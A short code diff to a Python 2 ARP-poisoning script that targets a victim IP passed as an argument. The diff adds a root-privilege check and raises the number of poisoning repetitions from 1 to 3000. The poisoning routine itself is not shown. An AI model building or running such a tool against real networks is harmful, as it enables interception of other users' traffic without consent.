@@ -32,7 +32,8 @@ def get_default_gateway():
    #################################################################################
    
    
-   
+def isSuperUser():
+	return (os.geteuid() ==0)   
    
    
    
@@ -69,9 +70,17 @@ def ARP_poisoning((routerIP,routerMAC),(victimIP,victimMAC)):
 
 
 def main():
-	times=1
+	
+	times=3000
 	interval=0.05
 	print'=====================================START======================================='	
+	if(not isSuperUser()):
+		print 'Must be a root (su) to run this program!'
+		print 'exiting...'
+		print '---------------------------------------------------------------------------------'
+		sys.exit(1)
+
+	
 	if (len(sys.argv)<2):
 		print 'Error:\tNot enough args!!!'
 		print 'Enter the IP address of the victim as arg '
